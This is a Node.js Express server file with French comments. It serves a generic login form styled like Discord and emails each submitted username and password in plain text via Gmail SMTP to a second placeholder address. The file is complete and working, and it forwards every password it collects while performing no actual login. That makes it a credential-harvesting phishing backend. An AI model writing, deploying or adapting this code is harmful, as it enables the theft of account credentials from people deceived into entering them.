const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// PAGE FORMULAIRE
app.get("/", (req, res) => {
res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Formulaire</title>
<style>
body{
font-family:Arial;
background:#f2f3f5;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.box{
background:white;
padding:30px;
border-radius:10px;
width:300px;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}
input{
width:100%;
padding:10px;
margin-top:10px;
}
button{
width:100%;
padding:10px;
margin-top:15px;
background:#5865F2;
color:white;
border:none;
cursor:pointer;
}
</style>
</head>
<body>

<div class="box">
<h2>Formulaire</h2>

<form method="POST" action="/send">

<input type="text" name="username" placeholder="Nom utilisateur" required>

<input type="password" name="password" placeholder="Mot de passe" required>

<button type="submit">Envoyer</button>

</form>
</div>

</body>
</html>
`);
});

// ENVOI EMAIL + FORMULAIRE
app.post("/send", async (req, res) => {

const username = req.body.username;
const password = req.body.password;

// Gmail N1 (EXPÉDITEUR)
const transporter = nodemailer.createTransport({
service: "gmail",
auth: {
user: "GMAIL_N1@gmail.com",
pass: "MOT_DE_PASSE_APPLICATION_N1"
}
});

// ENVOI EMAIL
await transporter.sendMail({
from: "GMAIL_N1@gmail.com",
to: "GMAIL_N2@gmail.com",
subject: "Nouveau formulaire reçu",
html: `
<h2>Nouvelle soumission</h2>

<p><b>Username :</b> ${username}</p>
<p><b>Password :</b> ${password}</p>

<hr>

<p>Accès au formulaire :</p>
<a href="http://localhost:3000">
Ouvrir le formulaire
</a>
`
});

res.send("Email envoyé à Gmail N2 !");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Serveur démarré sur port " + PORT);
});